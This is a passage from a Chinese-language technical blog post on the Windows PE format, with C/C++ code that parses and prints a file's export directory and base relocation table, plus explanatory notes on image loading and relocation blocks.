class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">PrintfExportDir</span><span class=\"params\">(IN LPSTR lpszFile)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tLPVOID pFileBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//从filebuffer - imagebuffer</span></span><br><span class=\"line\">\tDWORD fileLen = <span class=\"built_in\">ReadPEFile</span>(lpszFile, &amp;pFileBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pFirstSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(<span class=\"built_in\">sizeof</span>(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\"><span class=\"comment\">//\tcout &lt;&lt; hex &lt;&lt; pOptionHeader-&gt;DataDirectory[0].VirtualAddress &lt;&lt; &quot;\\n&quot;;</span></span><br><span class=\"line\">\t<span class=\"comment\">//把VirtualAddress转为foa</span></span><br><span class=\"line\">\tDWORD FOA = <span class=\"built_in\">RvaToFileOffset</span>(pFileBuffer, pOptionHeader-&gt;DataDirectory[<span class=\"number\">0</span>].VirtualAddress);</span><br><span class=\"line\">\t<span class=\"comment\">//打印export ditectory</span></span><br><span class=\"line\"><span class=\"comment\">//\tcout &lt;&lt; hex &lt;&lt; FOA &lt;&lt; &quot;\\n&quot;;</span></span><br><span class=\"line\">\tPIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pFileBuffer + FOA);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pExportDirectory-&gt;Characteristics:%X\\n&quot;</span>,pExportDirectory-&gt;Characteristics);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pExportDirectory-&gt;TimeDateStamp:%X\\n&quot;</span>,pExportDirectory-&gt;TimeDateStamp);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pExportDirectory-&gt;MajorVersion:%X\\n&quot;</span>,pExportDirectory-&gt;MajorVersion);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pExportDirectory-&gt;MinorVersion:%X\\n&quot;</span>,pExportDirectory-&gt;MinorVersion);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pExportDirectory-&gt;Name:%X\\n&quot;</span>,pExportDirectory-&gt;Name);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pExportDirectory-&gt;Base:%X\\n&quot;</span>,pExportDirectory-&gt;Base);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pExportDirectory-&gt;NumberOfFunctions:%X\\n&quot;</span>,pExportDirectory-&gt;NumberOfFunctions);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pExportDirectory-&gt;NumberOfNames:%X\\n&quot;</span>,pExportDirectory-&gt;NumberOfNames);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pExportDirectory-&gt;AddressOfFunctions:%X\\n&quot;</span>,pExportDirectory-&gt;AddressOfFunctions);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pExportDirectory-&gt;AddressOfNameOrdinals:%X\\n&quot;</span>,pExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pExportDirectory-&gt;AddressOfNames:%X\\n&quot;</span>,pExportDirectory-&gt;AddressOfNames);</span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;-------------------&quot;</span> &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//打印addresofFunction</span></span><br><span class=\"line\">\tDWORD NumOfFunFoa = <span class=\"built_in\">RvaToFileOffset</span>(pFileBuffer, pExportDirectory-&gt;AddressOfFunctions);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;pExportDirectory-&gt;NumberOfFunctions;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; hex &lt;&lt; *(PDWORD)((DWORD)pFileBuffer + NumOfFunFoa + i*<span class=\"number\">4</span>) &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;-------------------&quot;</span> &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//打印addressofnames</span></span><br><span class=\"line\">\tDWORD AddressFoa = <span class=\"built_in\">RvaToFileOffset</span>(pFileBuffer, pExportDirectory-&gt;AddressOfNames);</span><br><span class=\"line\">\tDWORD nameFOA = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* name = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> k=<span class=\"number\">0</span>;k&lt;pExportDirectory-&gt;NumberOfNames;k++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tnameFOA = <span class=\"built_in\">RvaToFileOffset</span>(pFileBuffer, *(PDWORD)((DWORD)pFileBuffer + AddressFoa));</span><br><span class=\"line\">\t\tname = (<span class=\"type\">char</span>*)(nameFOA + (DWORD)pFileBuffer);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>,name);</span><br><span class=\"line\">\t\tAddressFoa += <span class=\"number\">4</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tcout &lt;&lt; <span class=\"string\">&quot;-------------------&quot;</span> &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//打印AddressOfNameOrdinals</span></span><br><span class=\"line\">\tDWORD OrdinalFoa = <span class=\"built_in\">RvaToFileOffset</span>(pFileBuffer, pExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> m=<span class=\"number\">0</span>;m&lt;pExportDirectory-&gt;NumberOfNames;m++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; hex &lt;&lt; *(PWORD)((DWORD)pFileBuffer + OrdinalFoa + m*<span class=\"number\">2</span>) + pExportDirectory-&gt;Base &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">GetFunctionAddrByName</span><span class=\"params\">(IN LPSTR lpszFile, IN LPVOID pFileBuffer, IN <span class=\"type\">char</span>* pFuncName)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tDWORD fileLen = <span class=\"built_in\">ReadPEFile</span>(lpszFile, &amp;pFileBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pFirstSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(<span class=\"built_in\">sizeof</span>(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\t<span class=\"comment\">//把VirtualAddress转为foa</span></span><br><span class=\"line\">\tDWORD FOA = <span class=\"built_in\">RvaToFileOffset</span>(pFileBuffer, pOptionHeader-&gt;DataDirectory[<span class=\"number\">0</span>].VirtualAddress);</span><br><span class=\"line\">\tDWORD nameFOA = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* name = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pFileBuffer + FOA);</span><br><span class=\"line\">\tDWORD AddressFoa = <span class=\"built_in\">RvaToFileOffset</span>(pFileBuffer, pExportDirectory-&gt;AddressOfNames);</span><br><span class=\"line\">\tDWORD OrdinalFoa = <span class=\"built_in\">RvaToFileOffset</span>(pFileBuffer, pExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class=\"line\">\tDWORD NumOfFunFoa = <span class=\"built_in\">RvaToFileOffset</span>(pFileBuffer, pExportDirectory-&gt;AddressOfFunctions);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> k=<span class=\"number\">0</span>;k&lt;pExportDirectory-&gt;NumberOfNames;k++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tnameFOA = <span class=\"built_in\">RvaToFileOffset</span>(pFileBuffer, *(PDWORD)((DWORD)pFileBuffer + AddressFoa));</span><br><span class=\"line\">\t\tname = (<span class=\"type\">char</span>*)(nameFOA + (DWORD)pFileBuffer);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span>(name,(<span class=\"type\">char</span>*)pFuncName) == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tDWORD num = *(PWORD)((DWORD)pFileBuffer + OrdinalFoa + k*<span class=\"number\">2</span>);</span><br><span class=\"line\">\t\t\tDWORD haha = *(PDWORD)((DWORD)pFileBuffer + NumOfFunFoa + num*<span class=\"number\">4</span>);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//cout &lt;&lt; hex &lt;&lt; haha &lt;&lt; &quot;\\n&quot;;</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> haha;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tAddressFoa += <span class=\"number\">4</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">GetFunctionAddrByOrdinals</span><span class=\"params\">(IN LPSTR lpszFile, IN LPVOID pFileBuffer, IN DWORD OutNum)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tDWORD fileLen = <span class=\"built_in\">ReadPEFile</span>(lpszFile, &amp;pFileBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pFirstSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class=\"line\">\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class=\"line\">\tpFileHeader = (PIMAGE_FILE_HEADER)(<span class=\"built_in\">sizeof</span>(pNTHeader-&gt;Signature) + (DWORD)pNTHeader);</span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\t<span class=\"comment\">//把VirtualAddress转为foa</span></span><br><span class=\"line\">\tDWORD FOA = <span class=\"built_in\">RvaToFileOffset</span>(pFileBuffer, pOptionHeader-&gt;DataDirectory[<span class=\"number\">0</span>].VirtualAddress);</span><br><span class=\"line\">\tDWORD nameFOA = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* name = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pFileBuffer + FOA);</span><br><span class=\"line\">\tDWORD AddressFoa = <span class=\"built_in\">RvaToFileOffset</span>(pFileBuffer, pExportDirectory-&gt;AddressOfNames);</span><br><span class=\"line\">\tDWORD OrdinalFoa = <span class=\"built_in\">RvaToFileOffset</span>(pFileBuffer, pExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class=\"line\">\tDWORD NumOfFunFoa = <span class=\"built_in\">RvaToFileOffset</span>(pFileBuffer, pExportDirectory-&gt;AddressOfFunctions);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> xiabiao = OutNum - pExportDirectory-&gt;Base;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;pExportDirectory-&gt;NumberOfFunctions;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (i == xiabiao)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tDWORD address = *(PDWORD)((DWORD)pFileBuffer + NumOfFunFoa + i*<span class=\"number\">4</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> address;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"重定位表\"><a class=\"markdownIt-Anchor\" href=\"#重定位表\">#</a> 重定位表</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230311170507585.png\" alt=\"image-20230311170507585\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">程序加载可以理解为贴图的过程，先开辟4G虚拟内存，先把exe放在ImageBase，分SizeOfimage大小</span><br><span class=\"line\">在加载dll，一般在70000000开始，每个dll都从自己的imagebase开始，分sizeofimage大小</span><br><span class=\"line\">dll贴完，指向oep，程序就可以运行了</span><br><span class=\"line\"></span><br><span class=\"line\">一般情况下，EX都是可以按照ImageBase的地址进行加载的.因为Exe拥有自己独立的4GB 的虚拟内存空间但DLL不是DLL是有EXE使用它，才加载到相关EXE的进程空间的.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">为了提高搜索的速度，模块间地址也是要对齐的模块地址对齐为10000H也就是64K</span><br><span class=\"line\"></span><br><span class=\"line\">编译时生成的地址= ImageBase + RVA</span><br><span class=\"line\">如果加载的时候没有按照预定加载，那么绝对地址会不可用</span><br><span class=\"line\">所以需要一张表保存绝对地址</span><br><span class=\"line\"></span><br><span class=\"line\">目录向的第六个结构是重定位表</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _IMAGE_DATA_DIRECTORY &#123;</span><br><span class=\"line\">    DWORD   VirtualAddress;</span><br><span class=\"line\">    DWORD   Size;</span><br><span class=\"line\">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br><span class=\"line\"></span><br><span class=\"line\">RVA -&gt; FOA</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _IMAGE_BASE_RELOCATION &#123;</span><br><span class=\"line\">    DWORD   VirtualAddress;</span><br><span class=\"line\">    DWORD   SizeOfBlock;</span><br><span class=\"line\">&#125; IMAGE_BASE_RELOCATION;</span><br><span class=\"line\">typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230311173859344.png\" alt=\"image-20230311173859344\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">virtualaddress放修改的起始地址</span><br><span class=\"line\">Virtualaddress + 块中数据 = 要修改的地址的RVA</span><br><span class=\"line\">每一块中是一页中需要修改的地址</span><br><span class=\"line\">每页为4k，每个页只需要12位二进制，因此2字节够标识所有的地址，即块内数据都是2字节</span><br><span class=\"line\">内存中的页大小是1000H也就是说2的12次方就可以表示一个页内所有的偏移地址具体项的宽度是16字节高四位代表类型:值为3代表的是需要修改的数据值为o代表的是用于数据对齐的数据，可以不用修改.也就是说我们只关注高四位为3</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">但分空间还是要分16个，因为内存对齐</span><br><span class=\"line\">因此计算RVA时只需要计算低12位，低12位 + x就是需要修改的RVA</span><br><span class=\"line\">高四位果 = 3，那么需要改修， =0代表不需要修复</span><br><span class=\"line\"></span><br><span class=\"line\">最后一个块是一个全0结构， &amp; 判断</span><br><span class=\"line\"></span><br><span class=\"line\">块中多少 = (SizeOfBlock - 8) / 2</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230311175130539.png\" alt=\"image-20230311175130539\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">PrintRelocationDirectory</span><span class=\"params\">(IN LPSTR lpszFile)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tLPVOID pFileBuffer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tDWORD fileLen = ReadPEFile(lpszFile, &amp;pFileBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDosHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNTHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_FILE_HEADER pFileHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_OPTIONAL_HEADER pOptionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_SECTION_HEADER pSectionHeader = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPIMAGE_BASE_RELOCATION pRelocationTable = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;\t<span class=\"comment\">// 强转 DOS_HEADER 结构体指针</span></span><br><span class=\"line\">\t<span class=\"comment\">//可选PE头\t  简化后的处理</span></span><br><span class=\"line\">\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew + <span class=\"number\">4</span> + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class=\"line\">\tpRelocationTable = (PIMAGE_BASE_RELOCATION)((DWORD)pFileBuffer + RvaToFileOffset(pFileBuffer, pOptionHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress));</span><br><span class=\"line\">\t<span class=\"comment\">//pRelocationTable = (PIMAGE_BASE_RELOCATION)(RvaToFileOffset(pFileBuffer, pOptionHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress));</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Relocation Table Rva: %#x\\n&quot;</span>, pRelocationTable-&gt;VirtualAddress);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//pRelocationTable = (PIMAGE_BASE_RELOCATION)RvaToFileOffset(pFileBuffer,pRelocationTable-&gt;VirtualAddress);</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> ( pRelocationTable-&gt;VirtualAddress &amp;&amp; pRelocationTable-&gt;SizeOfBlock)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;第%d个块VirtualAddress:%X\\n&quot;</span>, i, pRelocationTable-&gt;VirtualAddress);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;第%d个块SizeOfBlock:%X\\n&quot;</span>, i,pRelocationTable-&gt;SizeOfBlock);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;第%d个块项数:%X\\n&quot;</span>, i, 